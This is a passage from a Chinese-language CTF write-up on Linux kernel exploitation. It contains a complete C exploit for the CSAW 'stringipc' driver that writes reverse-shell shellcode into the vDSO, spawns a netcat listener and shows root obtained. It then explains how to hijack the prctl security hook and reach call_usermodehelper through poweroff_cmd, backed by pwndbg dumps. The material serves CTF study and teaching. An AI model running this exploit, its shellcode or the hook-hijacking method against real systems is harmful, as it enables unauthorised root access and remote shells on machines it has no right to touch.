class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>,*(<span class="keyword">char</span> *)(addr+i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"vdso:%lx\n"</span>, addr);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr,<span class="number">0x1000</span>,shellcode,<span class="built_in">strlen</span>(shellcode) ))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr ;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05"</span>;</span><br><span class="line"><span class="comment">//"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05";</span></span><br><span class="line"><span class="comment">//set target in task_struct</span></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">"try2findmep4nda"</span>);</span><br><span class="line">prctl(PR_SET_NAME , target);</span><br><span class="line">fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] alloc_channel error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] now we get a channel %d\n"</span>,alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] we can read and write any momery"</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = addr<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line"><span class="keyword">if</span>(( !<span class="built_in">strcmp</span>(<span class="string">"gettimeofday"</span>,buf+<span class="number">0x2cd</span>)) )&#123; <span class="comment">// ((*(size_t *)(buf) == 0x00010102464c457f)) &amp;&amp; </span></span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found vdso %lx\n"</span>,result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found , try again "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ioctl(fd,CSAW_CLOSE_CHANNEL,&amp;close_args);</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = result<span class="number">-0x10</span>+<span class="number">0xc80</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = shellcode;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"><span class="keyword">if</span>(check_vsdo_shellcode(shellcode)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] shellcode is written into vdso, waiting for a reverse shell :"</span>);</span><br><span class="line">system(<span class="string">"nc -lp 3333"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] someting wrong ... "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//show_vdso_userspace(0xc30);</span></span><br><span class="line">ioctl(fd,CSAW_CLOSE_CHANNEL,&amp;close_args);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可以验证反弹shell提权成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./pwn</span><br><span class="line">[+] now we get a channel 1</span><br><span class="line">[+] we can read and write any momery</span><br><span class="line">[+] found vdso ffffffff83c04000</span><br><span class="line">vdso:7ffd53da9000</span><br><span class="line">[+] shellcode is written into vdso, waiting for a reverse shell :</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><h1 id="3-HijackPrctl"><a href="#3-HijackPrctl" class="headerlink" title="3 HijackPrctl"></a>3 HijackPrctl</h1><p>强网杯中，simp1e师傅出了一道solid_core题目，用的正是此题的加强版，主要限制了内存写的范围必须大于0xffffffff80000000，并且限制了vdso的写入，预期解是这种HijackPrctl方法。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这种漏洞利用的原理在dong-hoon you(x86)分享的《New Reliable Android Kernel Root Exploitation Techniques》中提到，这种技术被用于安卓root，可以绕过PXN防御。</p><p>首先在用户执行prctl函数时，实际上是将全部参数传递给security_task_prctl函数（\kernel\sys.c 2075）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line"><span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>而security_task_prctl（\security\security.c）中通过hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);将参数原封不动的传入hook进行处理，而这个hook位于内核的data段上，内核态有读写权限，因此可以通过修改这个位置劫持ptctl函数的执行流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> thisrc;</span><br><span class="line"><span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">rc = thisrc;</span><br><span class="line"><span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在《New Reliable Android Kernel Root Exploitation Techniques》提到了一个函数call_usermodehelper（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。但其中提到在安卓利用时需要关闭SEAndroid。另外，这个函数与execve函数参数相似，注意的是命令第一个参数必须是程序的全路径，而不能是相对路径，如”ls”必须写成”/bin/ls”，坑了好久…</p><p>起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * call_usermodehelper() - prepare and start a usermode application</span></span><br><span class="line"><span class="comment"> * @path: path to usermode executable</span></span><br><span class="line"><span class="comment"> * @argv: arg vector for process</span></span><br><span class="line"><span class="comment"> * @envp: environment for process</span></span><br><span class="line"><span class="comment"> * @wait: wait for the application to finish and return status.</span></span><br><span class="line"><span class="comment"> *        when UMH_NO_WAIT don't wait at all, but you get no useful error back</span></span><br><span class="line"><span class="comment"> *        when the program couldn't be exec'ed. This makes it safe to call</span></span><br><span class="line"><span class="comment"> *        from interrupt context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function is the equivalent to use call_usermodehelper_setup() and</span></span><br><span class="line"><span class="comment"> * call_usermodehelper_exec().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就把视野转向这个函数还在哪里被调用，通过ida 的x命令可以找到一共被调用了四次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Downptomoyo_load_policy+DDcall    near ptr call_usermodehelper-2E1792h</span><br><span class="line">Downpcgroup_release_agent+CCcall    near ptr call_usermodehelper-7C191h</span><br><span class="line">Downprun_cmd+35call    near ptr call_usermodehelper-0BF9Ah</span><br><span class="line">Uppmce_do_trigger+1Bcall    call_usermodehelper+552B0h</span><br></pre></td></tr></table></figure><p>tomoyo_load_policy（security\tomoyo\load_policy.c, line 84）和cgroup_release_agent（file kernel/cgroup.c, line 5753.）限制的比较死，就不赘述了。</p><p>mce_do_trigger（arch/x86/kernel/cpu/mcheck/mce.c, line 1323）的rdi、rsi两个参数也都是data段上的地址，可以通过任意写预先将要执行的命令布置在这个地址上，从而利用call_usermodehelper执行。但是要改的东西稍微多一点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">static void mce_do_trigger(struct work_struct *work)</span><br><span class="line">&#123;</span><br><span class="line">call_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x /10i mce_do_trigger</span><br><span class="line">   0xffffffff810422b0 &lt;mce_do_trigger&gt;:data16 data16 data16 xchg ax,ax</span><br><span class="line">   0xffffffff810422b5 &lt;mce_do_trigger+5&gt;:push   rbp</span><br><span class="line">   0xffffffff810422b6 &lt;mce_do_trigger+6&gt;:xor    ecx,ecx</span><br><span class="line">   0xffffffff810422b8 &lt;mce_do_trigger+8&gt;:xor    edx,edx</span><br><span class="line">   0xffffffff810422ba &lt;mce_do_trigger+10&gt;:mov    rsi,</span><br><span class="line">   0xffffffff810422c1 &lt;mce_do_trigger+17&gt;:mov    rdi,0xffffffff8217ed20</span><br><span class="line">   0xffffffff810422c8 &lt;mce_do_trigger+24&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff810422cb &lt;mce_do_trigger+27&gt;:call   0xffffffff81097580 &lt;call_usermodehelper&gt;</span><br><span class="line">   0xffffffff810422d0 &lt;mce_do_trigger+32&gt;:pop    rbp</span><br><span class="line">   0xffffffff810422d1 &lt;mce_do_trigger+33&gt;:ret    </span><br><span class="line">pwndbg&gt; x /10s 0xffffffff8217ed20</span><br><span class="line">0xffffffff8217ed20 &lt;mce_helper&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed21 &lt;mce_helper+1&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed22 &lt;mce_helper+2&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed23 &lt;mce_helper+3&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed24 &lt;mce_helper+4&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed25 &lt;mce_helper+5&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed26 &lt;mce_helper+6&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed27 &lt;mce_helper+7&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed28 &lt;mce_helper+8&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed29 &lt;mce_helper+9&gt;:&quot;&quot;</span><br><span class="line">pwndbg&gt; x /10gx 0xffffffff8217ed20</span><br><span class="line">0xffffffff8217ed20 &lt;mce_helper&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0xffffffff8217ed30 &lt;mce_helper+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0xffffffff8217ed40 &lt;mce_helper+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0xffffffff8217ed50 &lt;mce_helper+48&gt;:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>最后是run_cmd（kernel/reboot.c, line 393）这个函数就比较无脑了，里面会利用argv_split自动切割参数，但cmd还是存在参数截断的问题，继续查看调用可以发现reboot_work_func和poweroff_work_func两个函数都调用了run_cmd函数，并且内置的命令都是在内核里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> **argv;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">"HOME=/"</span>,</span><br><span class="line"><span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (argv) &#123;</span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">argv_free(argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">Downpreboot_work_func+<span class="number">10</span>call    run_cmd</span><br><span class="line">Downppoweroff_work_func+<span class="number">18</span>call    run_cmd</span><br></pre></td></tr></table></figure><p>这里又是一个坑，我起初用的reboot_work_func函数，但这个函数所用的reboot_cmd参数在.rodata段上，不具有写权限… 而poweroff_work_func函数的poweroff_cmd参数在.data段上可读可写（为啥要差别对待？？）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i reboot_work_func</span><br><span class="line">   0xffffffff810a3690 &lt;reboot_work_func&gt;:data16 data16 data16 xchg ax,ax</span><br><span class="line">   0xffffffff810a3695 &lt;reboot_work_func+5&gt;:push   rbp</span><br><span class="line">   0xffffffff810a3696 &lt;reboot_work_func+6&gt;:mov    rdi,0xffffffff81a26f80</span><br><span class="line">   0xffffffff810a369d &lt;reboot_work_func+13&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff810a36a0 &lt;reboot_work_func+16&gt;:call   0xffffffff810a34e0 &lt;run_cmd&gt;</span><br><span class="line">pwndbg&gt; x /s 0xffffffff81a26f80</span><br><span class="line">0xffffffff81a26f80 &lt;reboot_cmd&gt;:&quot;/sbin/reboot&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /7i poweroff_work_func</span><br><span class="line">   0xffffffff810a39c0 &lt;poweroff_work_func&gt;:data16 data16 data16 xchg ax,ax</span><br><span class="line">   0xffffffff810a39c5 &lt;poweroff_work_func+5&gt;:push   rbp</span><br><span class="line">   0xffffffff810a39c6 &lt;poweroff_work_func+6&gt;:mov    rdi,0xffffffff81e4dfa0</span><br><span class="line">   0xffffffff810a39cd &lt;poweroff_work_func+13&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff810a39d0 &lt;poweroff_work_func+16&gt;:push   rbx</span><br><span class="line">   0xffffffff810a39d1 &lt;poweroff_work_func+17&gt;:movzx  ebx,BYTE PTR [rip+0x1157ad8]        # 0xffffffff821fb4b0 &lt;poweroff_force&gt;</span><br><span class="line">   0xffffffff810a39d8 &lt;poweroff_work_func+24&gt;:call   0xffffffff810a34e0 &lt;run_cmd&gt;</span><br><span class="line">pwndbg&gt; x /s 0xffffffff81e4dfa0</span><br><span class="line">0xffffffff81e4dfa0 &lt;poweroff_cmd&gt;:&quot;/sbin/poweroff&quot;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" 